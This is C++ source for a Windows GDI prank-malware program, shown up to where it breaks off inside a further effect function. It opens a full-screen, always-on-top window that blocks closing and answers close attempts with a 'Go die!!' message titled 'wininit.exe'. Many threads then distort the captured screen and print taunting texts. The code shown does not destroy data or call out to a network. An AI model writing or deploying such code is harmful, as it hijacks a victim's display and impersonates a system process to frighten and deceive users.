﻿#pragma warning(disable: 4995)
#pragma comment(lib, "Dwmapi.lib")
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include<dwmapi.h>
//#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
#pragma optimize("", off)//disable "t>>t" return 0
HWND GDIWindow;
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE: {
        ShowWindow(hwnd, SW_SHOW);
        SetTimer(hwnd, 0, 50, 0);
        break;
    }
    case WM_PAINT: {
        ValidateRect(hwnd, 0);
        break;
    }
    case WM_CTLCOLORDLG: {
        return (BOOL)(HBRUSH)GetStockObject(NULL_BRUSH);
        break;
    }
    case WM_TIMER: {
        SetWindowPos(GDIWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSENDCHANGING | SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
        break;
    }
    case WM_DESTROY: {
        if (wParam!=0x7891) { return false; }
        KillTimer(hwnd, 0);
        DestroyWindow(hwnd);
        PostQuitMessage(0);
        break;
    }
    case WM_CLOSE: {
        if (wParam != 0x7891) {
            MessageBoxA(NULL, "Go die!!", "wininit.exe", MB_ICONERROR);
            return false;
        }
        SendMessage(GDIWindow, WM_DESTROY, 0x7891, 0);
        break;
    }
    case WM_SIZE: {
        SetWindowPos(GDIWindow, HWND_TOPMOST, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), SWP_SHOWWINDOW | SWP_NOACTIVATE);
        break;
    }
    case WM_GETMINMAXINFO: {
        MINMAXINFO* p = (MINMAXINFO*)lParam;
        p->ptMinTrackSize.x = GetSystemMetrics(0); p->ptMinTrackSize.y = GetSystemMetrics(1);
        p->ptMaxTrackSize.x = GetSystemMetrics(0); p->ptMaxTrackSize.y = GetSystemMetrics(1);
        return true;
        break;
    }
    case WM_WINDOWPOSCHANGING: {
        WINDOWPOS* pWindowPos = (WINDOWPOS*)lParam;
        pWindowPos->flags |= SWP_NOMOVE | SWP_NOSIZE;
        return DefWindowProc(hwnd, message, wParam, (LPARAM)pWindowPos);
        break;
    }
    case WM_SYSCOMMAND: {
        break;
    }
    case WM_SHOWWINDOW: {
        ShowWindow(GDIWindow, SW_SHOW);
    }
    case WM_DISPLAYCHANGE: {
        SetWindowPos(GDIWindow, HWND_TOPMOST, 0, 0, GetSystemMetrics(0), GetSystemMetrics(1), SWP_SHOWWINDOW | SWP_NOACTIVATE);
        break;
    }
    }
    return DefWindowProc(hwnd, message, wParam, lParam);
}
#define RESET "\033[0m"
DWORD WINAPI ErrorConsole(LPVOID lpParam) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    const int fgColors[] = { 30,31,32,33,34,35,36,37,90,91,92,93,94,95,96,97 };
    const int bgColors[] = { 40,41,42,43,44,45,46,47,100,101,102,103,104,105,106,107 };
    for (int t=0;;t++) {
        char a = static_cast<char>(rand() % 114 + 14);
        std::cout << "\033[" << fgColors[rand() % 16] << ";" << bgColors[rand() % 16] << "m" << a << RESET;
    }
}
DWORD WINAPI Payload1a_Melt(LPVOID lpParam) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
        HBITMAP old = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int x = rand() % w, y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        x = rand() % w; y = rand() % h;
        BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 5 - 3, rand() % w, rand() % h, hcdc, x, y, NOTSRCCOPY);
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 180;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc2, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2);
        SelectObject(hcdc, old);
        DeleteObject(bmp);
        DeleteDC(hcdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload1b_Pie(LPVOID lpParam) {
    int x = 0, y = 0;
    int signX = 10, signY = 10;
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc2 = GetDC(GDIWindow);
        HBRUSH brush = CreateHatchBrush(rand() % 8, RndRGB);
        HBITMAP old = (HBITMAP)SelectObject(hdc2, brush);
        x += signX, y += signY;
        Pie(hdc2, x, y, x + 140, y + 140, x + rand() % 140, y + rand() % 140, x + rand() % 140, y + rand() % 140);
        if (x + 140 >= w)signX = -10;
        if (y + 140 >= h)signY = -10;
        if (x <= 0)signX = 10;
        if (y <= 0)signY = 10;
        SelectObject(hdc2, old);
        DeleteObject(brush);
        ReleaseDC(0, hdc2); Sleep(10);
    }
}
DWORD WINAPI Shader1_Rotate(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0;
    for (int i = 0;; i++, i %= 6) {
        HDC hdc = GetDC(0), hdcMem, hdc2 = GetDC(GDIWindow); HBITMAP hbm;
        hdcMem = CreateCompatibleDC(hdc2); hbm = CreateBitmap(w, h, 1, 32, data);
        HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
            rgb ^= (int)data + (2 * x + 223 - y & 212 + x | y);
            ((BYTE*)(data + i))[v] = rgb;
        }
        RotateDC(hdc2, rand() % 2 ? 1 : -1, { w / 2,h / 2 });
        SetBitmapBits(hbm, w * h * 4, data); StretchBlt(hdc2, -20, 20, w + 40, h - 40, hdcMem, 0, 0, w, h, SRCCOPY);
        SelectObject(hdcMem, old); DeleteObject(hbm); DeleteDC(hdcMem);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Payload2_Icons1(LPVOID lpParam) {
    for (;;) {
        int size = 32 + rand() % 118;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(GDIWindow);
        HICON ico = LoadIcon(0, lpIconNames[rand() % 6]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadCursor(0, lpCursorNames[rand() % 16]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader2_NoName1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0;
    for (;;) {
        HDC hdc = GetDC(0), hdcMem, hdc2 = GetDC(GDIWindow); HBITMAP hbm;
        ; hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 80;
            rgb = (int)data + ((BYTE*)(data + i + rand() % 100))[v];
            ((BYTE*)(data + i))[v] = rgb;
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc2, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        int x = rand() % w, y = rand() % h;
        BitBlt(hdc2, x + rand() % 30 - 10, y + rand() % 30 - 10, rand() % 700, rand() % 700, hdcMem, x, y, SRCCOPY);
        SelectObject(hdcMem, old); DeleteObject(hbm); DeleteDC(hdcMem);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader3_NoName2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int b = rand() % 78;
                rgbquad[x + w * y].rgb ^= x + b - y | x - 990;
            }
        }
        BitBlt(hdc2, rand() % 10, rand() % 10, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader4_NoName3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x + w * y) - x * y;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader5_NoName4(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                if (!(x < 12 || y > h - 12))rand() % 2 ? rgbquad[x + w * y].rgb |= rgbquad[(x - 10 % w) + w * (y + 10 % h)].rgb : rgbquad[x + w * y].rgb &= rgbquad[(x - 10 % w) + w * (y + 10 % h)].rgb;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader6_NoName5(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int rgb = RndRGB;
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].r += rgb;
                rgbquad[x + w * y].b += rgbquad[x + w * y].r - rgbquad[x + w * y].g;
                rgbquad[x + w * y].g += rgbquad[x + w * y].b - rgbquad[x + w * y].r;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCINVERT & SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader7_NoName6(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0;
    for (;;) {
        HDC hdc = GetDC(0), hdcMem, hdc2 = GetDC(GDIWindow); HBITMAP hbm;
        hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 80;
            rgb ^= (int)data + (x & y + i | y + 990);
            ((BYTE*)(data + i))[v] = rgb;
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc2, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        SelectObject(hdcMem, old); DeleteObject(hbm); DeleteDC(hdcMem);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(10);
    }
}
DWORD WINAPI Shader8_NoName7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL), hdc2;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    hdc = GetDC(0); HDC hdcCopy = CreateCompatibleDC(hdc);
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    ReleaseDC(0, hdc);
    INT i = 0;
    for (;;) {
        hdc = GetDC(NULL); hdc2 = GetDC(GDIWindow);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + i * pow(x * (x - y | y), (1.0 / 3.0)));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 180;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc2, rand() % 10 - 5, rand() % 10 - 5, w, h, hdcCopy, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hdc2);
        Sleep(100);
    }
}
struct Point3D {
    float x, y, z;
};
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
VOID DrawCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ) {
    Point3D ver[8] = {
        {-size , -size, -size},
        {size,  -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size}
    };
    POINT scrP[8];
    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(ver[i], angleX, angleY, angleZ);
        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);
        scrP[i].x = screenX;
        scrP[i].y = screenY;
    }
    POINT pl1[5] = { scrP[0],scrP[1],scrP[2],scrP[3],scrP[0] };
    Polyline(hdc, pl1, 5);
    POINT pl2[5] = { scrP[4],scrP[5],scrP[6],scrP[7],scrP[4] };
    Polyline(hdc, pl2, 5);
    POINT conL[8] = { scrP[0],scrP[4],scrP[1],scrP[5],scrP[2],scrP[6],scrP[3],scrP[7] };
    Polyline(hdc, &conL[0], 2);
    Polyline(hdc, &conL[2], 2);
    Polyline(hdc, &conL[4], 2);
    Polyline(hdc, &conL[6], 2);
    for (int i = 0; i < 8; i++) {
        HICON ico;
        DrawIcon(hdc, scrP[i].x, scrP[i].y, ico = LoadIcon(0, lpIconNames[rand() % 6]));
        DestroyIcon(ico);
    }
}
DWORD WINAPI Payload3_Cube(LPVOID lpParam) {
    int x = 0, y = 0;
    float x2 = 0, y2 = 0;
    float x3 = 0, y3 = 0, z = 0;
    int signX = 10, signY = 10;
    for (;;) {
        HDC hdc = GetDC(GDIWindow);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        x += signX; y += signY;
        x2 += signX;
        y2 += signY;
        if (x <= 0) { signX = 10; x2 = 100; }
        if (y <= 0) { signY = 10; y2 = 100; }
        if (x + 100 >= w) { signX = -10; x2 = w - 100; }
        if (y + 100 >= h) { signY = -10; y2 = h - 100; }
        HPEN pen;
        HBITMAP old = (HBITMAP)SelectObject(hdc, pen = CreatePen(0, 1, 0xffffff));
        DrawCube(hdc, { x2, y2, 0.0f }, 100, x3, y3, z);
        x3 += 0.04;
        y3 += 0.04;
        z += 0.04;
        SelectObject(hdc, old); DeleteObject(pen);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4_BlackBgr(LPVOID lpParam) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hdc2 = GetDC(GDIWindow), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, 0, 0, 0, BLACKNESS);
        StretchBlt(hdc2, 0, 0, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, 0, h / 3, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, 0, (h / 3) * 2, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, w / 3, (h / 3) * 2, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, (h / 3) * 2, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, h / 3, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, 0, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, w / 3, 0, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, w / 3, h / 3, w / 3, h / 3, hcdc, 0, 0, w, h, SRCCOPY);
        Sleep(150);
        StretchBlt(hdc2, 0, 0, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, 0, h / 3, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, 0, (h / 3) * 2, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, w / 3, (h / 3) * 2, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, (h / 3) * 2, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, h / 3, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, (w / 3) * 2, 0, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, w / 3, 0, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        Sleep(150);
        StretchBlt(hdc2, w / 3, h / 3, w / 3, h / 3, 0, 0, 0, w, h, BLACKNESS);
        SelectObject(hcdc, old);
        DeleteObject(bmp); DeleteDC(hcdc);
        ReleaseDC(0, hdc); ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Payload5_Text(LPVOID lpParam) {
    LPCSTR texts[] = { "L0S3R","What you want to say?","L0L","78915418813141145141919810","Go die!!!","Still using this computer?","This equipment is useless.","by uiui","MalwairMgr.exe" };
    LPCWSTR fonts[] = { L"Microsoft Ya Hei",L"Tempus Sans ITC",L"Sentury",L"Comic Sans MS",L"Lucida Console",L"Mistral" };
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(GDIWindow);
        HFONT hFont = CreateFontW(140, 0, rand() % 360, FW_THIN, rand() % 1, rand() % 1, rand() % 1, rand() % 1, ANSI_CHARSET, 0, 0, 0, 0, fonts[rand() % 6]); HBITMAP old = (HBITMAP)SelectObject(hdc, hFont);
        SetBkMode(hdc, 0); SetTextColor(hdc, RndRGB);
        int rrr = rand() % 9; TextOutA(hdc, rand() % w, rand() % h, texts[rrr], strlen(texts[rrr]));
        SelectObject(hdc, old); DeleteObject(hFont);
        ReleaseDC(0, hdc); Sleep(1);
    }
}
DWORD WINAPI Shader9_NoName8(LPVOID lpParam) {
